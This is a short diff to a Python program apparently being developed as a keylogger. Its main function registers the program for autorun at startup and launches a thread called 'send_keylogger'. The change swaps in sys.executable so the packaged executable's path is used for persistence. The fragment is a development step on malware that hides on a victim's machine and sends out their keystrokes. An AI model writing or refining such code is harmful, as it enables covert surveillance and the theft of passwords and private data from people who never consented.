@@ -106,7 +106,8 @@ class Core:
 
     def main(self):
         """Função main, define as threads e pega o caminho do programa para a função autorun"""
-        exe_path = os.path.abspath(sys.argv[0])
+        exe_path = os.path.abspath(sys.executable)
+
         self.autorun(exe_path)
 
         t1 = threading.Thread(target=self.send_keylogger)
